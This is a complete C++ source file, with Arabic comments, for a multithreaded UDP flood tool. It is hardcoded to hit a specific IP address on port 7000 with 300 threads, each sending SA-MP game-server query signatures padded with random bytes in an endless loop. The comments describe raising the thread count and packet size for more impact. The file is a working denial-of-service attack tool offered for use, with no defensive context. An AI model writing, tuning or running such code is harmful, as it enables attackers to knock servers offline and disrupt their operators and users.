#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <random>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

// تحديد الهدف والثوابت مباشرة داخل الكود
const std::string TARGET_IP = "89.46.1.130";
const int TARGET_PORT = 7000;
const int THREAD_COUNT = 300; // زيادة عدد الخيوط لمضاعفة الأداء

void stressWorker() {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    sockaddr_in dest_addr;
    std::memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(TARGET_PORT);
    
#ifdef _WIN32
    dest_addr.sin_addr.s_addr = inet_addr(TARGET_IP.c_str());
#else
    inet_pton(AF_INET, TARGET_IP.c_str(), &dest_addr.sin_addr);
#endif

    // التوقيعات والحزم الأساسية
    std::vector<std::string> base_sigs = {
        "SAMP\x90\xd9\x1d\x4d\x61\x1e\x70\x0a\x46\x5b\x00",
        "SAMP\x95\x38\xe1\xa9\x61\x1e\x63",
        "SAMP\x95\x38\xe1\xa9\x61\x1e\x69",
        "\x08\x1e\x62\xda",
        "\x08\x1e\x77\xda"
    };

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, base_sigs.size() - 1);
    std::uniform_int_distribution<> byte_dis(0, 255);

    while (true) {
        std::string payload = base_sigs[dis(gen)];
        
        // إضافة بيانات عشوائية لتضخيم حجم الحزمة
        char random_bytes[256];
        for (int i = 0; i < 256; ++i) {
            random_bytes[i] = static_cast<char>(byte_dis(gen));
        }
        payload.append(random_bytes, 256);

        sendto(sock, payload.c_str(), payload.length(), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
    }

#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
}

int main() {
    std::cout << "=========================================================" << std::endl;
    std::cout << "[*] بدء التشغيل العالي الأداء إلى الهدف: " << TARGET_IP << ":" << TARGET_PORT << std::endl;
    std::cout << "[*] عدد الخيوط النشطة: " << THREAD_COUNT << std::endl;
    std::cout << "=========================================================" << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(stressWorker);
    }

    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }

    return 0;
}
